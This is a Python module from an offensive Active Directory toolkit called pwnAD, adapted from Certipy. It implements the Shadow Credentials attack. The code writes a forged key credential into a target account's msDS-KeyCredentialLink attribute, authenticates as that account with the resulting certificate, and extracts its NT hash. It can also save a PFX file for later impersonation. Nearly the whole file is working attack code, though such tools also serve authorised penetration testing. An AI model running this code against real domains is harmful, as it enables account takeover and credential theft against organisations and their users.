# Implementation from Certipy/certipy/commands/shadow.py
# Copyright (c) 2021 ly4k


from typing import List, Tuple

import ldap3
import logging
import OpenSSL
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.common.data.DNWithBinary import DNWithBinary
from dsinternals.common.data.hello.KeyCredential import KeyCredential
from dsinternals.system.DateTime import DateTime
from dsinternals.system.Guid import Guid

from pwnAD.lib.certificate import create_pfx, der_to_cert, der_to_key, rsa, x509
from pwnAD.lib.auth import Authenticate
from pwnAD.lib.utils import check_error
from pwnAD.commands.getNThash import getNThash



def get_key_credentials(conn, target_dn, target):
    results = conn._ldap_connection.search(
        search_base=target_dn,
        search_filter="(objectClass=*)",
        attributes=["msDS-KeyCredentialLink"],
    )
    if results == False:
        logging.error(f"Could not get the Key Credentials for {target}")
        return None

    result = conn._ldap_connection.entries[0].entry_raw_attributes
    result = result["msDS-KeyCredentialLink"]

    return result

def set_key_credentials(conn, target_dn, key_credential):
    try:
        conn._ldap_connection.modify(target_dn,{"msDS-KeyCredentialLink": [ldap3.MODIFY_REPLACE, key_credential]},)
        return True
    except Exception as e:
        error_code = conn._ldap_connection.result['result']
        check_error(conn, error_code, e)
        return False

def generate_key_credential(target_dn: str, subject: str) -> Tuple[X509Certificate2, KeyCredential, str]:
    logging.info("Generating certificate")

    if len(subject) >= 64:
        logging.warning("Subject too long. Limiting subject to 64 characters.")
        subject = subject[:64]

    cert = X509Certificate2(
        subject=subject,
        keySize=2048,
        notBefore=(-40 * 365),
        notAfter=(40 * 365),
    )
    logging.info("Certificate generated")

    logging.info("Generating Key Credential")
    key_credential = KeyCredential.fromX509Certificate2(
        certificate=cert,
        deviceId=Guid(),
        owner=target_dn,
        currentTime=DateTime(),
    )

    device_id = key_credential.DeviceId.toFormatD()
    logging.info("Key Credential generated with DeviceID %s" % repr(device_id))

    return (cert, key_credential, device_id)

def add_new_key_credential(conn, target_dn, target) -> Tuple[X509Certificate2, KeyCredential, List[bytes], str]:
    cert, key_credential, device_id = generate_key_credential(target_dn, f"CN={target}")

    logging.debug("Key Credential: %s" % key_credential.toDNWithBinary().toString())

    saved_key_credential = get_key_credentials(conn, target_dn, target)

    if saved_key_credential is None:
        return None

    new_key_credential = saved_key_credential + [key_credential.toDNWithBinary().toString()]

    logging.info(f"Adding Key Credential with device ID {repr(device_id)} to the Key Credentials for {target}")
    result = set_key_credentials(conn, target_dn, new_key_credential)

    if result is False:
        return None

    logging.info(f"Successfully added Key Credential with device ID {repr(device_id)} to the Key Credentials for {target}")

    return (cert, new_key_credential, saved_key_credential, device_id)

def get_key_and_certificate(cert: X509Certificate2) -> Tuple[rsa.RSAPrivateKey, x509.Certificate]:
    key = der_to_key(OpenSSL.crypto.dump_privatekey(OpenSSL.crypto.FILETYPE_ASN1, cert.key))
    cert = der_to_cert(OpenSSL.crypto.dump_certificate(OpenSSL.crypto.FILETYPE_ASN1, cert.certificate))

    return (key, cert)

def auto(conn, target):
    if conn.exists(target) is False:
        logging.error("Targeted user doesn't exist")
        return False

    logging.info(f"Targeting user {target}" )
    target_dn = conn.get_dn_from_samaccountname(target, 'user')

    result = add_new_key_credential(conn, target_dn, target)
    if result is None:
        return False

    cert, _, saved_key_credential, _ = result

    key, cert = get_key_and_certificate(cert)

    logging.info(f"Authenticating as {target} with the certificate")
    authenticate = Authenticate(username=target, domain=conn.domain, cert=cert, key=key)
    authenticate.nthash = getNThash(authenticate, is_key_credential=True)

    logging.info(f"Restoring the old Key Credentials for {target}")
    result = set_key_credentials(conn, target_dn, saved_key_credential)

    if result is True:
        logging.info(f"Successfully restored the old Key Credentials for {target}")

    logging.info(f"NT hash for {target}, {authenticate.nthash}")

    return authenticate.nthash

def add(conn, target):
    if conn.exists(target) is False:
        logging.error("Targeted user doesn't exist")
        return False

    logging.info(f"Targeting user {target}" )
    target_dn = conn.get_dn_from_samaccountname(target, 'user')

    result = add_new_key_credential(conn, target_dn, target)
    if result is None:
        return False

    cert, _, _, device_id = result
    key, cert = get_key_and_certificate(cert)
    pfx = create_pfx(key, cert)

    out = f"{target.rstrip("$")}.pfx"
    with open(out, "wb") as f:
        f.write(pfx)

    logging.info(f"Saved certificate and private key to {out}")

def list(conn, target):
    if conn.exists(target) is False:
        logging.error("Targeted user doesn't exist")
        return False

    logging.info(f"Targeting user {target}" )
    target_dn = conn.get_dn_from_samaccountname(target, 'user')

    key_credentials = get_key_credentials(conn, target_dn, target)
    if key_credentials is None:
        return False

    if len(key_credentials) == 0:
        logging.info(f"The Key Credentials attribute for {target} is either empty or the current user does not have read permissions for the attribute")
        return True

    logging.info(f"Listing Key Credentials for {target}")
    for dn_binary_value in key_credentials:
        key_credential = KeyCredential.fromDNWithBinary(DNWithBinary.fromRawDNWithBinary(dn_binary_value))

        logging.info(f"DeviceID:{key_credential.DeviceId.toFormatD()} | Creation Time (UTC): {key_credential.CreationTime}")

def clear(conn, target):
    if conn.exists(target) is False:
        logging.error("Targeted user doesn't exist")
        return False

    logging.info(f"Targeting user {target}" )
    target_dn = conn.get_dn_from_samaccountname(target, 'user')

    logging.info(f"Clearing the Key Credentials for {target}")
    result = set_key_credentials(conn, target_dn, [])

    if result is True:
        logging.info(f"Successfully cleared the Key Credentials for {target}")

    return result

def remove(conn, target, device_id):
    if device_id is None:
        logging.error("A device ID (-device-id) is required for the remove operation")
        return False

    if conn.exists(target) is False:
        logging.error("Targeted user doesn't exist")
        return False

    logging.info(f"Targeting user {target}" )
    target_dn = conn.get_dn_from_samaccountname(target, 'user')

    key_credentials = get_key_credentials(conn, target_dn, target)
    if key_credentials is None:
        return False

    if len(key_credentials) == 0:
        logging.info(f"The Key Credentials attribute for {target} is either empty or the current user does not have read permissions for the attribute")
        return True

    new_key_credentials = []
    device_id_in_current_values = False
    for dn_binary_value in key_credentials:
        key_credential = KeyCredential.fromDNWithBinary(
            DNWithBinary.fromRawDNWithBinary(dn_binary_value)
        )
        if key_credential.DeviceId.toFormatD() == device_id:
            logging.info(f"Found device ID {repr(device_id)} in Key Credentials {target}")
            device_id_in_current_values = True
        else:
            new_key_credentials.append(dn_binary_value)

    if device_id_in_current_values is True:
        logging.info(f"Deleting the Key Credential with device ID {repr(device_id)} in Key Credentials for {target}")

        result = set_key_credentials(conn, target_dn, new_key_credentials)

        if result is True:
            logging.info(f"Successfully deleted the Key Credential with device ID {repr(device_id)} in Key Credentials for {target}")
        return result
    else:
        logging.error(f"Could not find device ID {repr(device_id)} in Key Credentials for {target}")
        return False

def info(conn, target, device_id):
    if device_id is None:
        logging.error("A device ID (-device-id) is required for the info operation")
        return False

    if conn.exists(target) is False:
        logging.error("Targeted user doesn't exist")
        return False

    logging.info(f"Targeting user {target}" )
    target_dn = conn.get_dn_from_samaccountname(target, 'user')

    key_credentials = get_key_credentials(conn, target_dn, target)
    if key_credentials is None:
        return False

    if len(key_credentials) == 0:
        logging.info(f"The Key Credentials attribute for {target} is either empty or the current user does not have read permissions for the attribute")
        return True

    for dn_binary_value in key_credentials:
        key_credential = KeyCredential.fromDNWithBinary(
            DNWithBinary.fromRawDNWithBinary(dn_binary_value)
        )
        if key_credential.DeviceId.toFormatD() == device_id:
            logging.info(f"Found device ID {repr(device_id)} in Key Credentials {target}")
            key_credential.show()
            return True

    logging.error(f"Could not find device ID {repr(device_id)} in Key Credentials for {target}")
    return False
